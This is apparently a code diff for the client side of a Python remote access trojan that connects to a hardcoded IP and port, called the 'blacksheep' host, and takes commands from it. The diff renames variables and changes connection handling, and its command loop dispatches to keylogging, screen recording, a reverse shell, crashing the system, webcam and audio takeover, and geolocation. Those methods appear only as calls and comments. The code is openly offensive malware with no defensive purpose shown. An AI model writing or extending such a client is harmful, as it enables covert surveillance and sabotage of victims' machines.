@@ -4,56 +4,61 @@ from time import sleep
 import pyautogui
 
 class Client:
-#client server starts here:
+#client code starts here:
     def __init__(self):
         self.host = "172.17.105.160"
         self.port = 9090
         self.route = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     
-    def loopback(self):
+    def connection_to_server(self):
         try:
             self.route.connect((self.host, self.port))
             print("connection established: ")
-        except socket.error as err:
-            print("connection error occured")
-            self.loopback()
             self.messaging()
+        except ConnectionRefusedError as err:
+            print("SORRY YOU CANNOT CONNECT TO THE BLACKSHEEP HOST")
+
+        except KeyboardInterrupt:
+            print("\n YOU CLOSED THE CONNECTION")
+            self.route.close()
     
     def messaging(self):
         while True:
-            self.data = self.route.recv(1024).decode("utf-8")
-            if not self.data or self.data == "END":
+            self.data_from_blacksheep = self.route.recv(1024).decode("utf-8")
+            print(self.data_from_blacksheep)
+            if not self.data_from_blacksheep or self.data_from_blacksheep == "END":
                 #incase there is no data from blacksheep {self destruct}
                 break
-            if self.data == 1:
+            if self.data_from_blacksheep == 1:
                 #screen recording goes here
                 self.screen_record()
                 pass
-            if self.data == 2:
+            if self.data_from_blacksheep == 2:
                 #keylogger codes goes here
                 self.keylogger()
                 pass
-            if self.data == 3:
+            if self.data_from_blacksheep == 3:
                 #screen reverse shell goes here
                 self.reverse_shell()
                 pass
-            if self.data == 4:
+            if self.data_from_blacksheep == 4:
                 #crashing the entire system
                 self.crash_sys()
                 pass
-            if self.data == 5:
+            if self.data_from_blacksheep == 5:
                 #take over cameras and audio
                 self.webcam()
                 pass
-            if self.data == 6:
+            if self.data_from_blacksheep == 6:
                 #get the exact locations
                 self.geolocate()
                 pass
             else:
                 pass
+
     def main(self):
-        self.loopback()
-#client server ends here:
+        self.connection_to_server()
+#client code ends here:
 
 class AttackModes:
     def __init__(self):
